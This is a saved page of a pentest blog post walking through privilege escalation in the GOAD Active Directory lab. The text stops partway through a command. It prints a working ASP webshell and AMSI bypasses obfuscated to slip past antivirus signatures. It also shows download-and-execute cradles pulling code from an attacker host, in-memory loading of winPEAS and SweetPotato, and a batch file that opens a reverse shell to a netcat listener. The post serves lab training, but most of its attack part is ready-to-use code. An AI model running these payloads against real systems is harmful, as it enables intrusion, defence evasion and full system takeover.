<!DOCTYPE html><html lang="fr" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="GOAD - part 8 - Privilege escalation" /><meta property="og:locale" content="fr" /><meta name="description" content="In the previous post (Goad pwning part7) we tried some attacks with MSSQL on the domain. This time we will get a web shell on IIS and try some privilege escalation techniques." /><meta property="og:description" content="In the previous post (Goad pwning part7) we tried some attacks with MSSQL on the domain. This time we will get a web shell on IIS and try some privilege escalation techniques." /><link rel="canonical" href="https://mayfly277.github.io/posts/GOADv2-pwning-part8/" /><meta property="og:url" content="https://mayfly277.github.io/posts/GOADv2-pwning-part8/" /><meta property="og:site_name" content="Mayfly" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-25T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GOAD - part 8 - Privilege escalation" /><meta name="twitter:site" content="@M4yFly" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In the previous post (Goad pwning part7) we tried some attacks with MSSQL on the domain. This time we will get a web shell on IIS and try some privilege escalation techniques.","url":"https://mayfly277.github.io/posts/GOADv2-pwning-part8/","@type":"BlogPosting","headline":"GOAD - part 8 - Privilege escalation","dateModified":"2022-10-22T10:56:54+02:00","datePublished":"2022-09-25T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mayfly277.github.io/posts/GOADv2-pwning-part8/"},"@context":"https://schema.org"}</script><title>GOAD - part 8 - Privilege escalation | Mayfly</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mayfly"><meta name="application-name" content="Mayfly"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mayfly.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mayfly</a></div><div class="site-subtitle font-italic">Hack, Code, Sleep, Repeat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/mayfly277" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/M4yFly" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mayfly277','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.root-me.org/mayfly" aria-label="rootme" class="order-6" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>GOAD - part 8 - Privilege escalation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GOAD - part 8 - Privilege escalation</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> mayfly </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 25, 2022, 12:00 AM +0200" >Sep 25<i class="unloaded">2022-09-25T00:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 22, 2022, 10:56 AM +0200" >Oct 22<i class="unloaded">2022-10-22T10:56:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1521 words">8 min read</span></div></div><div class="post-content"><p>In the previous post (<a href="/posts/GOADv2-pwning-part7/">Goad pwning part7</a>) we tried some attacks with MSSQL on the domain. This time we will get a web shell on IIS and try some privilege escalation techniques.</p><h2 id="iis---webshell">IIS - webshell</h2><ul><li>There is a simple asp.net application on http://192.168.56.22/, this application only give us a simple file upload functionality.</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_iss_upload.png" alt="privesc_iss_upload.png" /></p><ul><li>From there we can upload a basic webshell in asp : webshell.asp (at the time of writing, this avoid defender signature)</ul><pre><code class="language-asp">&lt;%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%&gt;
&lt;HTML&gt;
    &lt;BODY&gt;
        Enter command:
            &lt;FORM action="" method="POST"&gt;
                &lt;input type="text" name="param" size=45 value="&lt;%= myValue %&gt;"&gt;
                &lt;input type="submit" value="Run"&gt;
            &lt;/FORM&gt;
            &lt;p&gt;
        Result :
        &lt;% 
        myValue = request("param")
        thisDir = getResult("cmd /c" &amp; myValue)
        Response.Write(thisDir)
        %&gt;
        &lt;/p&gt;
        &lt;br&gt;
    &lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre><ul><li>The webshell is uploaded in the upload folder.<li>And we have a command execution on the IIS server</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_iss_webshell.png" alt="privesc_iss_webshell.png" /></p><ul><li>We can get a reverse shell with the same method used for mssql</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_iss_revshell.png" alt="privesc_iss_revshell.png" /></p><ul><li>As a IIS service user we got SeImpersonatePrivilege privilege ! (same thing on mssql, the service got this permission by default)</ul><h2 id="privesc">Privesc</h2><ul><li>There is a lot of privesc technics on microsoft windows. Here we will just try two that got a “not fix” by microsoft, printspoofer and krbrelay.</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_mindmap.png" alt="privesc_mindmap.png" /></p><ul><li>As the privesc is run on the target computer, in this chapter we will do some powershell to escalate our privileges.</ul><h3 id="amsi-bypass">AMSI bypass</h3><blockquote><p>To do all my tests, i enable windows defender on all system. Castelblack got defender disabled by default, you should enable it before testing the privesc technics described here</p></blockquote><ul><li><p>To be able to play usually AV detected application from memory you should bypass the Anti Malware Scanning Interface (AMSI) on the current process</p><li><p>There is multiple ways to bypass AMSI and you can find them on the github page : <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></p><li><p>Also you can find custom generated payload in this website <a href="https://amsi.fail/">amsi.fail</a></p><li><p>All the public available method seems to be signed, but we can also pick one and make some hand made small modifications on it</p><li><p>Original :</p></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># Matt Graebers second Reflection method</span><span class="w">
</span><span class="p">[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">([</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'amsiContext'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">),</span><span class="mi">0</span><span class="n">x41414141</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><ul><li>Modified version:</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$x</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="o">+</span><span class="s1">'siUt'</span><span class="o">+</span><span class="s1">'ils'</span><span class="p">);</span><span class="nv">$y</span><span class="o">=</span><span class="nv">$x</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'am'</span><span class="o">+</span><span class="s1">'siCon'</span><span class="o">+</span><span class="s1">'text'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$y</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">);[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">(</span><span class="nv">$z</span><span class="p">,</span><span class="mi">0</span><span class="n">x41424344</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><ul><li>This is trivial modifications, but this is enough to bypass the signature at the time of writing.<li>Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level.<li>If you want to know why you have to do that, you should read this blog post from @ShitSecure explaining the difference between powershell and .net AMSI level : <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c"># Patching amsi.dll AmsiScanBuffer by rasta-mouse</span><span class="w">
</span><span class="nv">$Win32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$Win32</span><span class="w">

</span><span class="nv">$LoadLibrary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"amsi.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$Address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$LoadLibrary</span><span class="p">,</span><span class="w"> </span><span class="s2">"AmsiScanBuffer"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="nv">$Patch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">xB8</span><span class="p">,</span><span class="w"> </span><span class="nx">0x57</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00</span><span class="p">,</span><span class="w"> </span><span class="nx">0x07</span><span class="p">,</span><span class="w"> </span><span class="nx">0x80</span><span class="p">,</span><span class="w"> </span><span class="nx">0xC3</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$Patch</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><ul><li>We put the bypass script on our disk and load it remotely</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server 8080
</pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/amsi_rmouse.txt'</span><span class="p">)</span><span class="o">|</span><span class="n">IEX</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_amsi_bypass.png" alt="privesc_amsi_bypass.png" /></p><ul><li>Once we have done that, we can play what we want with the condition to don’t touch the disk ! #the_disk_is_lava<li>We can now play all our .net application by running them directly with execute assembly.</ul><h3 id="winpeas-without-touching-disk">winPeas without touching disk</h3><ul><li>My favorite tools to look for privilege escalation is without a doubt <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a><li>We already bypass amsi on the previous step, what we can do now to avoid detection is put winpeas on an http server and load it in memory<li><a href="https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter/">This article</a> explain very well how to load and run an assembly with powershell full in memory.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /var/www/html
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
python3 <span class="nt">-m</span> http.server 8080
</pre></table></code></div></div><ul><li>And play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly) :</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$data</span><span class="o">=</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/winPEASany_ofs.exe'</span><span class="p">);</span><span class="w">
</span><span class="nv">$asm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$data</span><span class="p">);</span><span class="w">
</span><span class="nv">$out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Console</span><span class="p">]::</span><span class="n">Out</span><span class="p">;</span><span class="nv">$sWriter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">IO.StringWriter</span><span class="p">;[</span><span class="n">Console</span><span class="p">]::</span><span class="n">SetOut</span><span class="p">(</span><span class="nv">$sWriter</span><span class="p">);</span><span class="w">
</span><span class="p">[</span><span class="n">winPEAS.Program</span><span class="p">]::</span><span class="n">Main</span><span class="p">(</span><span class="s2">""</span><span class="p">);[</span><span class="n">Console</span><span class="p">]::</span><span class="n">SetOut</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span><span class="nv">$sWriter</span><span class="o">.</span><span class="nf">ToString</span><span class="p">()</span><span class="w">
</span></pre></table></code></div></div><ul><li><p>WinPeas take several minutes to complete and give the prompt back with all the info (without the capture of the console out the output is empty in our basic powershell reverseshell, if you got a “real” shell you don’t have to do that and just launch the <code class="language-plaintext highlighter-rouge">[winPEAS.Program]::Main("");</code> without the console stuff, thanks to PowerSharpPack code for the trick)</p><li><p>If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> and get everything done for you (thanks again to @ShitSecure).</p></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1'</span><span class="p">)</span><span class="w">
</span><span class="n">PowerSharpPack</span><span class="w"> </span><span class="nt">-winPEAS</span><span class="w">
</span></pre></table></code></div></div><ul><li>And we get the information of SEImpersonate Privilege to use for escalation <img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_winPEAS.png" alt="privesc_winPEAS.png" /></ul><h3 id="packing-your-net-binary-for-powershell">Packing your .net binary for powershell</h3><ul><li>If you don’t want to use binary from internet (and you should don’t use pre-compiled code grabbed on github on your pentest mission), you can also pack you own binary with the following script : <a href="https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e">EncodeAssembly.ps1</a><li><p>This script is a modification of the one from @snovvcrash <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly">website</a> and some code of PowerSharpPack.</p><li>Pack with the following commands :</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\EncodeAssembly.ps1</span><span class="w">
</span><span class="nx">Invoke-EncodeAssembly</span><span class="w"> </span><span class="nt">-binaryPath</span><span class="w"> </span><span class="nx">winPEAS.exe</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="nx">winPEAS</span><span class="w"> </span><span class="nt">-capture</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></pre></table></code></div></div><ul><li>To be use as reflective assembly in powershell remember you should avoid environment.exit() in the .net code and also you must set the class and the main method public.</ul><h3 id="seimpersonateprivilege-to-authoritysystem">SeImpersonatePrivilege to Authority\system</h3><ul><li><p>To escalate privilege from our iis (or mssql) user with SeImpersonatePrivilege to Authority\system we can use one of the “potatoes” technic.</p><li><p>A wonderfull blog post explain the different potatoes here : <a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></p><li>So let’s use <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>, a compilation of all the technics, <em>“the potatoe to rule them all”</em>.<li><p>Ok so we clone the project and compile it with visualStudio</p><li>Prepare a bat file to run ou powershell basic reverse shell on execution</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">cd </span>www
<span class="nb">echo</span> <span class="s2">"@echo off"</span> <span class="o">&gt;</span> runme.bat
<span class="nb">echo</span> <span class="s2">"start /b </span><span class="si">$(</span>python3 payload.py 192.168.56.1 4445<span class="si">)</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> runme.bat
<span class="nb">echo</span> <span class="s2">"exit /b"</span> <span class="o">&gt;&gt;</span> runme.bat
python3 <span class="nt">-m</span> http.server 8080
</pre></table></code></div></div><ul><li>Prepare the listener</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 4445
</pre></table></code></div></div><ul><li>With our reverse shell play the following command</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">mkdir</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/runme.bat'</span><span class="p">,</span><span class="s1">'c:\temp\runme.bat'</span><span class="p">)</span><span class="w">
</span><span class="nv">$data</span><span class="o">=</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/SweetPotato.exe'</span><span class="p">);</span><span class="w">
</span><span class="nv">$asm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$data</span><span class="p">);</span><span class="w">
</span><span class="nv">$out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Console</span><span class="p">]::</span><span class="n">Out</span><span class="p">;</span><span class="nv">$sWriter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">IO.StringWriter</span><span class="p">;[</span><span class="n">Console</span><span class="p">]::</span><span class="n">SetOut</span><span class="p">(</span><span class="nv">$sWriter</span><span class="p">);</span><span class="w">
